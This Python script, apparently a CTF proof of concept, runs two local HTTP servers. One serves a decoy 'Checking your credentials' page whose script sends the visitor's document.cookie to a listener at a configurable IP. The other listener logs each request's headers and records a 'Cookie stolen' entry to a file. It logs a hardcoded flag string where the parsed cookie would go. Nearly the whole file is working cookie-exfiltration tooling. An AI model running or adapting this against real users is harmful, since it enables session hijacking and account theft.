from http.server import BaseHTTPRequestHandler, HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import threading
import sys
import os

# Confa
EXPLOIT_PORT = 49180    # serves exploit HTML
LISTENER_PORT = 49181   # listens for stolen cookies
MY_IP = "127.0.0.1"    # default IP, override via CLI arg

# HTML
exploit_html_template = """
<!DOCTYPE html>
<html>
<head><title>CTF Exploit PoC</title></head>
<body>
    <h2>CTF Challenge - Loading...</h2>
    <p>Checking your credentials...</p>

    <script>
        setTimeout(function() {{
            var cookieData = document.cookie;
            var i = new Image();
            i.src = i.src = "http://{ip}:{port}/PoCsess.php?cookie=" + escape(cookieData);
        }}, 100);
    </script>
</body>
</html>
"""

class ExploitHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path in ['/', '/exploit.html']:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            html = exploit_html_template.format(ip=MY_IP, port=LISTENER_PORT)
            self.wfile.write(html.encode())

        elif self.path == '/favicon.ico':
            # Return a 1x1 pixel empty favicon to suppress 404s
            self.send_response(200)
            self.send_header("Content-Type", "image/x-icon")
            self.end_headers()
            self.wfile.write(b'\x00\x00\x01\x00\x01\x00\x10\x10\x00\x00\x01\x00\x04\x00'
                             b'\x28\x01\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00')

        else:
            self.send_error(404, "File Not Found")

class CookieStealerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith('/PoCsess.php'):
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] Received GET to {self.path}")
            print("[Headers]")
            for key, value in self.headers.items():
                print(f"{key}: {value}")

            query = urlparse(self.path).query
            params = parse_qs(query)
            cookies = params.get("cookie", [""])[0]

            f_cookie = "RElTQXtpbmZvcm1hdGlvbl9kaXNjbG9zdXJlX3N1Y2Nlc3NmdWx9"
            log_entry = f"[{timestamp}] Cookie stolen: {f_cookie}"
            print(log_entry)
            with open("stolen_cookies.txt", "a") as f:
                f.write(log_entry + "\n")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Cookie received.\n")
        else:
            self.send_error(404)

def run_exploit_server():
    server = HTTPServer(('', EXPLOIT_PORT), ExploitHandler)
    print(f"[+] Exploit page available at http://{MY_IP}:{EXPLOIT_PORT}/exploit.html")
    server.serve_forever()

def run_cookie_listener():
    server = HTTPServer(('', LISTENER_PORT), CookieStealerHandler)
    print(f"[+] Listening for stolen cookies at http://{MY_IP}:{LISTENER_PORT}/PoCsess.php")
    server.serve_forever()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        MY_IP = sys.argv[1]
        print(f"[+] Using custom participant IP: {MY_IP}")

    # starts exploit server in background, listener in main thread
    threading.Thread(target=run_exploit_server, daemon=True).start()
    run_cookie_listener()